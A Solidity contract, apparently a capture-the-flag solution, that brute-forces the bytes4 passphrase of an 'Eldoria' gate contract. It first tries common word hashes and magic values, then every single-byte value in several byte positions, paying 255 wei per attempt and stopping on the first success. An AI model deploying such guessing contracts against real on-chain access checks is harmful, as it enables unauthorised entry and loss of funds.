// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IEldoriaGate {
    function enter(bytes4 passphrase) external payable;
}

contract EldoriaExploitV2 {
    IEldoriaGate public target;
    event Success(bytes4 passphrase);

    constructor(address _target) {
        target = IEldoriaGate(_target);
    }

    // Try with different patterns
    function exploit() external payable {
        require(msg.value >= 0.1 ether, "Need at least 0.1 ether");

        // Try common patterns for secrets
        bytes4[] memory patterns = new bytes4[](10);
        patterns[0] = bytes4(keccak256("GATE"));
        patterns[1] = bytes4(keccak256("ELDORIA"));
        patterns[2] = bytes4(keccak256("SECRET"));
        patterns[3] = bytes4(keccak256("ENTER"));
        patterns[4] = bytes4(keccak256("PASSWORD"));
        patterns[5] = bytes4(0x12345678);
        patterns[6] = bytes4(0xdeadbeef);
        patterns[7] = bytes4(0xc0ffee42);
        patterns[8] = bytes4(0x00000000);
        patterns[9] = bytes4(0xffffffff);

        for (uint i = 0; i < patterns.length; i++) {
            try target.enter{value: 255}(patterns[i]) {
                emit Success(patterns[i]);
                return;
            } catch {}
        }

        // If common patterns fail, try alternatives
        // First byte could be important, others might be ignored
        for (uint i = 0; i < 256; i++) {
            bytes4 passphrase = bytes4(uint32(i) << 24);
            try target.enter{value: 255}(passphrase) {
                emit Success(passphrase);
                return;
            } catch {}
        }

        // Try both byte orderings (endianness)
        for (uint i = 0; i < 256; i++) {
            bytes4 passphrase1 = bytes4(uint32(i));  // 0x000000XX
            bytes4 passphrase2 = bytes4(uint32(i) << 8);  // 0x0000XX00
            bytes4 passphrase3 = bytes4(uint32(i) << 16);  // 0x00XX0000

            try target.enter{value: 255}(passphrase1) {
                emit Success(passphrase1);
                return;
            } catch {}

            try target.enter{value: 255}(passphrase2) {
                emit Success(passphrase2);
                return;
            } catch {}

            try target.enter{value: 255}(passphrase3) {
                emit Success(passphrase3);
                return;
            } catch {}
        }

        revert("No working passphrase found");
    }
}
